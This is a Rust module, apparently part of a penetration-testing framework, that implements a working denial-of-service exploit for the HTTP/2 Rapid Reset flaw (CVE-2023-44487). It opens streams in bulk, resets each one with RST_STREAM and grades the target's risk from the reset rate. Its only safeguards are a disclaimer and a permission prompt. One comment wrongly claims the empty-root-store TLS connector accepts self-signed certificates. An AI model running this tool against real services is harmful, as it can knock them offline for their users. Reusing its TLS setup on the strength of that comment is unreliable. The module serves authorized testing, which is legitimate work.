//! HTTP/2 Rapid Reset Denial of Service - CVE-2023-44487
//!
//! This module tests for and exploits the HTTP/2 Rapid Reset vulnerability that allows
//! denial of service attacks by rapidly creating and resetting HTTP/2 streams.
//!
//! ## Vulnerability Details
//! - **CVE**: CVE-2023-44487
//! - **Affected**: Multiple HTTP/2 implementations
//! - **Attack Vector**: Rapid stream creation and reset
//! - **Impact**: Denial of Service (DoS)
//!
//! ## Usage
//! ```bash
//! run exploit http2/cve_2023_44487_http2_rapid_reset <target>
//! ```
//!
//! The module performs:
//! 1. Baseline test with normal HTTP/2 requests
//! 2. Rapid reset attack test
//! 3. Vulnerability analysis based on reset rates
//!
//! ## Security Notes
//! - Proper IPv6 address handling via utils.rs normalize_target
//! - Timeout handling for all network operations
//! - Connection cleanup and resource management
//! - Error handling with context
//!
//! **WARNING**: Only use on systems you own or have permission to test!
//!
//! Original Author: Madhusudhan Rajappa
//! Date: 29th August 2025
//! Version: HTTP/2.0

use anyhow::{anyhow, Context, Result};
use colored::*;
use h2::client::Builder;
use h2::Reason;
use std::net::ToSocketAddrs;
use std::time::{Duration, Instant};
use tokio::net::TcpStream;
use tokio::time::timeout;
use tokio_rustls::TlsConnector;
use rustls::pki_types::ServerName;

use crate::utils::{
    normalize_target, prompt_yes_no, prompt_int_range,
};

/// Displays module banner
fn banner() {
    println!(
        "{}",
        r#"
╔═══════════════════════════════════════════════════════════╗
║   CVE-2023-44487 HTTP/2 Rapid Reset DoS Vulnerability     ║
║   Tester                                                  ║
║                                                           ║
║   WARNING: Only use on systems you own or have            ║
║   permission to test!                                     ║
╚═══════════════════════════════════════════════════════════╝
"#
        .cyan()
    );
}

/// Parse and validate target using utils.rs normalize_target
/// Returns (host, port) tuple with proper IPv6 handling
fn parse_target(target: &str) -> Result<(String, u16)> {
    // Use utils.rs normalize_target for comprehensive validation
    let normalized = normalize_target(target)?;
    
    // Check if normalized result contains a port
    if normalized.starts_with('[') {
        // IPv6 format: [::1]:port or [::1]
        if let Some(bracket_end) = normalized.find(']') {
            let host = normalized[1..bracket_end].to_string();
            let rest = &normalized[bracket_end + 1..];
            if rest.starts_with(':') {
                let port = rest[1..].parse::<u16>()
                    .context("Invalid port number in normalized target")?;
                return Ok((host, port));
            } else {
                return Ok((host, 443)); // Default HTTPS port
            }
        }
        return Err(anyhow!("Invalid IPv6 format from normalize_target"));
    }
    
    // IPv4 or hostname format: host:port or host
    if let Some(colon_pos) = normalized.rfind(':') {
        let host = normalized[..colon_pos].to_string();
        let port = normalized[colon_pos + 1..].parse::<u16>()
            .context("Invalid port number in normalized target")?;
        Ok((host, port))
    } else {
        Ok((normalized, 443)) // Default HTTPS port
    }
}

/// Normalize IPv6 host with brackets for socket address resolution
fn normalize_host_for_socket(host: &str) -> String {
    let stripped = host.trim_matches(|c| c == '[' || c == ']');
    if stripped.contains(':') && !stripped.starts_with('[') {
        format!("[{}]", stripped)
    } else {
        stripped.to_string()
    }
}

/// Create TLS connector with empty root store (accepts self-signed certs)
/// NOTE: Empty root store means no CA certs are trusted by default.
/// For security testing, this is acceptable as we're testing the protocol.
fn create_tls_connector() -> TlsConnector {
    use std::sync::Arc;
    use tokio_rustls::rustls::ClientConfig;

    // Create an empty root store - allows connections but cert validation will fail
    // for untrusted certs (which is fine for security testing of HTTP/2)
    let root_store = tokio_rustls::rustls::RootCertStore::empty();
    
    let config = ClientConfig::builder()
        .with_root_certificates(root_store)
        .with_no_client_auth();

    TlsConnector::from(Arc::new(config))
}

/// Perform baseline test with normal HTTP/2 requests
async fn baseline_test(
    host: &str,
    port: u16,
    use_ssl: bool,
    num_requests: usize,
) -> Result<()> {
    println!("{}", format!("\n[*] Performing baseline test with {} normal requests...", num_requests).yellow());
    
    let host_normalized = normalize_host_for_socket(host);
    let addr = format!("{}:{}", host_normalized, port);
    let socket_addr = addr
        .to_socket_addrs()
        .context("Invalid target address format")?
        .next()
        .context("Could not resolve target address")?;

    let stream = timeout(Duration::from_secs(10), TcpStream::connect(socket_addr))
        .await
        .context("Connection timeout")?
        .context("Failed to connect")?;
    
    let scheme = if use_ssl { "https" } else { "http" };
    
    // Format host for URI (add brackets for IPv6)
    let uri_host = if host.contains(':') && !host.starts_with('[') {
        format!("[{}]", host)
    } else {
        host.to_string()
    };
    
    if use_ssl {
        let connector = create_tls_connector();
        let server_name = ServerName::try_from(host)
            .map_err(|_| anyhow!("Invalid server name: {}", host))?
            .to_owned();
        let tls_stream = timeout(Duration::from_secs(10), connector.connect(server_name, stream))
            .await
            .context("TLS handshake timeout")?
            .context("TLS handshake failed")?;
        
        let (mut sender, connection) = Builder::new()
            .handshake::<_, bytes::BytesMut>(tls_stream)
            .await
            .context("HTTP/2 handshake failed")?;

        // Spawn connection task
        let connection_task = tokio::spawn(async move {
            if let Err(e) = connection.await {
                eprintln!("Connection error: {:?}", e);
            }
        });

        let mut successful = 0;
        let start = Instant::now();

        for i in 0..num_requests {
            let request = http::Request::builder()
                .uri(format!("{}://{}:{}/", scheme, uri_host, port))
                .body(())
                .context("Failed to build request")?;

            match sender.send_request(request, true) {
                Ok(_send_stream) => {
                    successful += 1;
                }
                Err(e) => {
                    println!("{}", format!("[-] Error sending request {}: {:?}", i, e).yellow());
                    break;
                }
            }

            if i < num_requests - 1 {
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        }

        let duration = start.elapsed();
        println!("{}", "[+] Baseline Results:".green());
        println!("  Total Requests: {}", num_requests);
        println!("  Successful: {}", successful);
        println!("  Success Rate: {:.2}%", (successful as f64 / num_requests as f64) * 100.0);
        println!("  Duration: {:.3}s", duration.as_secs_f64());

        // Cleanup
        drop(sender);
        let _ = timeout(Duration::from_secs(2), connection_task).await;
    } else {
        let (mut sender, connection) = Builder::new()
            .handshake::<_, bytes::BytesMut>(stream)
            .await
            .context("HTTP/2 handshake failed")?;

        // Spawn connection task
        let connection_task = tokio::spawn(async move {
            if let Err(e) = connection.await {
                eprintln!("Connection error: {:?}", e);
            }
        });

        let mut successful = 0;
        let start = Instant::now();

        for i in 0..num_requests {
            let request = http::Request::builder()
                .uri(format!("{}://{}:{}/", scheme, uri_host, port))
                .body(())
                .context("Failed to build request")?;

            match sender.send_request(request, true) {
                Ok(_send_stream) => {
                    successful += 1;
                }
                Err(e) => {
                    println!("{}", format!("[-] Error sending request {}: {:?}", i, e).yellow());
                    break;
                }
            }

            if i < num_requests - 1 {
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        }

        let duration = start.elapsed();
        println!("{}", "[+] Baseline Results:".green());
        println!("  Total Requests: {}", num_requests);
        println!("  Successful: {}", successful);
        println!("  Success Rate: {:.2}%", (successful as f64 / num_requests as f64) * 100.0);
        println!("  Duration: {:.3}s", duration.as_secs_f64());

        // Cleanup
        drop(sender);
        let _ = timeout(Duration::from_secs(2), connection_task).await;
    }

    Ok(())
}

/// Perform rapid reset attack test
async fn rapid_reset_test(
    host: &str,
    port: u16,
    use_ssl: bool,
    num_streams: usize,
    delay_ms: u64,
) -> Result<()> {
    println!("{}", format!("\n[*] Starting rapid reset test with {} streams...", num_streams).yellow());
    
    let host_normalized = normalize_host_for_socket(host);
    let addr = format!("{}:{}", host_normalized, port);
    let socket_addr = addr
        .to_socket_addrs()
        .context("Invalid target address format")?
        .next()
        .context("Could not resolve target address")?;

    let stream = timeout(Duration::from_secs(10), TcpStream::connect(socket_addr))
        .await
        .context("Connection timeout")?
        .context("Failed to connect")?;
    
    let scheme = if use_ssl { "https" } else { "http" };
    
    // Format host for URI (add brackets for IPv6)
    let uri_host = if host.contains(':') && !host.starts_with('[') {
        format!("[{}]", host)
    } else {
        host.to_string()
    };
    
    if use_ssl {
        let connector = create_tls_connector();
        let server_name = ServerName::try_from(host)
            .map_err(|_| anyhow!("Invalid server name: {}", host))?
            .to_owned();
        let tls_stream = timeout(Duration::from_secs(10), connector.connect(server_name, stream))
            .await
            .context("TLS handshake timeout")?
            .context("TLS handshake failed")?;
        
        let (mut sender, connection) = Builder::new()
            .handshake::<_, bytes::BytesMut>(tls_stream)
            .await
            .context("HTTP/2 handshake failed")?;

        // Spawn connection task
        let connection_task = tokio::spawn(async move {
            if let Err(e) = connection.await {
                eprintln!("Connection error: {:?}", e);
            }
        });

        let mut created_streams = Vec::new();
        let start = Instant::now();

        // Phase 1: Rapidly create streams
        println!("{}", "[*] Phase 1: Creating streams rapidly...".yellow());
        for i in 0..num_streams {
            let request = http::Request::builder()
                .uri(format!("{}://{}:{}/", scheme, uri_host, port))
                .header("user-agent", "CVE-2023-44487-Tester/1.0")
                .body(())
                .context("Failed to build request")?;

            match sender.send_request(request, false) {
                Ok((_response_future, send_stream)) => {
                    created_streams.push(send_stream);
                    if delay_ms > 0 && i < num_streams - 1 {
                        tokio::time::sleep(Duration::from_millis(delay_ms)).await;
                    }
                }
                Err(e) => {
                    println!("{}", format!("[-] Error creating stream {}: {:?}", i, e).red());
                    break;
                }
            }
        }

        let creation_duration = start.elapsed();
        println!("{}", format!("[+] Created {} streams in {:.3}s", created_streams.len(), creation_duration.as_secs_f64()).green());

        // Phase 2: Rapidly reset all streams
        println!("{}", "[*] Phase 2: Resetting streams rapidly...".yellow());
        let reset_start = Instant::now();
        let total_streams = created_streams.len();
        let mut reset_count = 0;

        let reset_delay = if delay_ms > 0 { delay_ms / 10.max(1) } else { 0 };
        
        for (idx, mut send_stream) in created_streams.into_iter().enumerate() {
            // Send RST_STREAM
            send_stream.send_reset(Reason::CANCEL);
            reset_count += 1;

            if reset_delay > 0 && idx < total_streams - 1 {
                tokio::time::sleep(Duration::from_millis(reset_delay)).await;
            }
        }

        let reset_duration = reset_start.elapsed();
        let total_duration = start.elapsed();
        let reset_rate = if reset_duration.as_secs_f64() > 0.0 {
            reset_count as f64 / reset_duration.as_secs_f64()
        } else {
            0.0
        };

        println!("{}", format!("[+] Reset {} streams in {:.3}s", reset_count, reset_duration.as_secs_f64()).green());
        println!("{}", format!("[+] Reset Rate: {:.1} resets/second", reset_rate).green());
        println!("{}", format!("[+] Total Duration: {:.3}s", total_duration.as_secs_f64()).green());

        // Phase 3: Analysis
        print_vulnerability_analysis(reset_rate);

        // Cleanup
        drop(sender);
        let _ = timeout(Duration::from_secs(2), connection_task).await;
    } else {
        let (mut sender, connection) = Builder::new()
            .handshake::<_, bytes::BytesMut>(stream)
            .await
            .context("HTTP/2 handshake failed")?;

        // Spawn connection task
        let connection_task = tokio::spawn(async move {
            if let Err(e) = connection.await {
                eprintln!("Connection error: {:?}", e);
            }
        });

        let mut created_streams = Vec::new();
        let start = Instant::now();

        // Phase 1: Rapidly create streams
        println!("{}", "[*] Phase 1: Creating streams rapidly...".yellow());
        for i in 0..num_streams {
            let request = http::Request::builder()
                .uri(format!("{}://{}:{}/", scheme, uri_host, port))
                .header("user-agent", "CVE-2023-44487-Tester/1.0")
                .body(())
                .context("Failed to build request")?;

            match sender.send_request(request, false) {
                Ok((_response_future, send_stream)) => {
                    created_streams.push(send_stream);
                    if delay_ms > 0 && i < num_streams - 1 {
                        tokio::time::sleep(Duration::from_millis(delay_ms)).await;
                    }
                }
                Err(e) => {
                    println!("{}", format!("[-] Error creating stream {}: {:?}", i, e).red());
                    break;
                }
            }
        }

        let creation_duration = start.elapsed();
        println!("{}", format!("[+] Created {} streams in {:.3}s", created_streams.len(), creation_duration.as_secs_f64()).green());

        // Phase 2: Rapidly reset all streams
        println!("{}", "[*] Phase 2: Resetting streams rapidly...".yellow());
        let reset_start = Instant::now();
        let total_streams = created_streams.len();
        let mut reset_count = 0;

        let reset_delay = if delay_ms > 0 { delay_ms / 10.max(1) } else { 0 };
        
        for (idx, mut send_stream) in created_streams.into_iter().enumerate() {
            // Send RST_STREAM
            send_stream.send_reset(Reason::CANCEL);
            reset_count += 1;

            if reset_delay > 0 && idx < total_streams - 1 {
                tokio::time::sleep(Duration::from_millis(reset_delay)).await;
            }
        }

        let reset_duration = reset_start.elapsed();
        let total_duration = start.elapsed();
        let reset_rate = if reset_duration.as_secs_f64() > 0.0 {
            reset_count as f64 / reset_duration.as_secs_f64()
        } else {
            0.0
        };

        println!("{}", format!("[+] Reset {} streams in {:.3}s", reset_count, reset_duration.as_secs_f64()).green());
        println!("{}", format!("[+] Reset Rate: {:.1} resets/second", reset_rate).green());
        println!("{}", format!("[+] Total Duration: {:.3}s", total_duration.as_secs_f64()).green());

        // Phase 3: Analysis
        print_vulnerability_analysis(reset_rate);

        // Cleanup
        drop(sender);
        let _ = timeout(Duration::from_secs(2), connection_task).await;
    }

    Ok(())
}

/// Print vulnerability analysis based on reset rate
fn print_vulnerability_analysis(reset_rate: f64) {
    println!("{}", "\n[*] Vulnerability Analysis:".yellow());
    
    if reset_rate > 1000.0 {
        println!("{}", "[!] HIGH RISK: Server accepts very high reset rates".red().bold());
        println!("{}", "    This may indicate vulnerability to CVE-2023-44487".red());
    } else if reset_rate > 100.0 {
        println!("{}", "[!] MEDIUM RISK: Server accepts moderate reset rates".yellow().bold());
        println!("{}", "    Further testing may be needed".yellow());
    } else {
        println!("{}", "[+] LOWER RISK: Server has rate limiting on resets".green());
        println!("{}", "    This suggests some protection against the vulnerability".green());
    }
}

/// Main entry point for auto-dispatch system
pub async fn run(target: &str) -> Result<()> {
    banner();

    // Parse and validate target using utils.rs normalize_target
    let (host, default_port) = parse_target(target)?;
    
    println!("{}", format!("[*] Target: {}:{}", host, default_port).cyan());

    // Interactive prompts using shared utilities
    let port = prompt_int_range("Target port", default_port as i64, 1, 65535)? as u16;
    let use_ssl = prompt_yes_no("Use SSL/TLS?", true)?;
    let num_streams = prompt_int_range("Number of streams for rapid reset test", 100, 1, 10000)? as usize;
    let delay_ms = prompt_int_range("Delay between operations (ms)", 1, 0, 1000)? as u64;
    let run_baseline = prompt_yes_no("Run baseline test first?", true)?;

    println!("\n{}", "=".repeat(60).cyan());
    println!("{}", format!("Target: {}:{}", host, port).yellow());
    println!("{}", format!("SSL: {}", if use_ssl { "Enabled" } else { "Disabled" }).yellow());
    println!("{}", format!("Streams: {}", num_streams).yellow());
    println!("{}", format!("Delay: {}ms", delay_ms).yellow());
    println!("{}", "=".repeat(60).cyan());

    // Legal disclaimer
    println!("\n{}", "LEGAL DISCLAIMER:".red().bold());
    println!("This tool is for authorized security testing only.");
    println!("Ensure you have permission to test the target system.");
    println!("Unauthorized use may be illegal.\n");

    if !prompt_yes_no("Do you have permission to test this system?", false)? {
        println!("{}", "Exiting. Only use this tool on systems you're authorized to test.".red());
        return Ok(());
    }

    // Run baseline test
    if run_baseline {
        if let Err(e) = baseline_test(&host, port, use_ssl, 10).await {
            println!("{}", format!("[-] Baseline test error: {}", e).red());
        }
    }

    // Run rapid reset test
    if let Err(e) = rapid_reset_test(&host, port, use_ssl, num_streams, delay_ms).await {
        println!("{}", format!("[-] Rapid reset test error: {}", e).red());
    }

    println!("\n{}", "[*] Test completed.".cyan());

    Ok(())
}
